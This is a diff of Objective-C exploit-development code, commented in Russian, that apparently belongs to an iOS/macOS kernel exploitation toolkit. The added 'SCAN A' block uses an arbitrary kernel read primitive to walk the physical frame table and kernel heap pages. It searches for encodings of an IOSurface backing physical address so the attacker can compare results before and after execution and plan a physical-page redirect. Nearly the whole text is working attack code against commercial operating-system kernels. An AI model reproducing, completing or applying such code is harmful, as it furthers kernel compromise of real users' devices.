@@ -5756,6 +5756,42 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
               proven ? @"ПОДТВЕРЖДЁН" : @"НЕ СОШЛОСЬ — стоп (записей не будет)"]);
     if (!backingPA || !proven) { free(ctl); return r; }
 
+    // 1.9.141 SCAN A: физика поверхности в kernel-структурах СРАЗУ после
+    //    create, ДО churn/submit/execute. Сравнение со SCAN B (после execute)
+    //    отвечает: create-wired (redirect после create невозможен) или
+    //    execute-wired (подмена просто не в то поле).
+    kpNote(r, @"  SCAN A (после create, до churn/submit):");
+    {
+        uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
+        uint64_t totalPages = kconstant(physSize) >> 14;
+        uint64_t pfn64m = backingPA >> 14;
+        int nHits = 0;
+        for (uint64_t pg = 0; pg < totalPages && nHits < 24; pg++) {
+            uint8_t ent[16];
+            kreadbuf(tableVA + pg * 16, ent, 16);
+            if (ent[2] != 0x21) continue;
+            uint64_t pa = kconstant(physBase) + pg * 0x4000;
+            uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+            if (!kva) continue;
+            uint8_t buf[0x4000];
+            if (!kreadbuf(kva, buf, sizeof(buf))) continue;
+            for (uint32_t o = 0; o + 8 <= sizeof(buf) && nHits < 24; o += 8) {
+                uint64_t q = 0;
+                memcpy(&q, buf + o, 8);
+                int form = 0;
+                if (q == backingPA) form = 1;
+                else if ((uint32_t)q == (uint32_t)pfn64m && !(q >> 32)) form = 2;
+                else if ((uint32_t)(q >> 32) == (uint32_t)pfn64m) form = 3;
+                else if ((uint32_t)q == (uint32_t)pfn64m) form = 4;
+                if (!form) continue;
+                nHits++;
+                kpNote(r, [NSString stringWithFormat:@"    [A] hit#%d форма%d @ %#llx: %#018llx", nHits, form,
+                          (unsigned long long)(kva + o), (unsigned long long)q]);
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [A] попаданий=%d (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)", nHits]);
+    }
+
     // 3. БЫСТРЫЙ резолв page-list через surface table нашего UC (раунд 17):
     //    [UC+0xe8] collection → +0xd0 array (индекс = surfaceID) → surfVA →
     //    +0x178 rangeObj → +0x18 = ranges[0] {pfn32(hi32), pagecount(lo32)}.
@@ -5926,7 +5962,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // heap (тип 0x21) на ВСЕ формы backingPA и печатаем попадания с
         // соседями: видно, какие структуры держат физику поверхности после
         // execute (live page-list / DART PTE / cache / копии).
-        kpNote(r, @"  резолв мимо — ИЗМЕРЕНИЕ: скан heap на формы backingPA после execute:");
+        kpNote(r, @"  SCAN B (после execute): скан heap на формы backingPA — сравниваем со SCAN A (create-wired vs execute-wired):");
         usleep(300000);
         uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
         uint64_t totalPages = kconstant(physSize) >> 14;
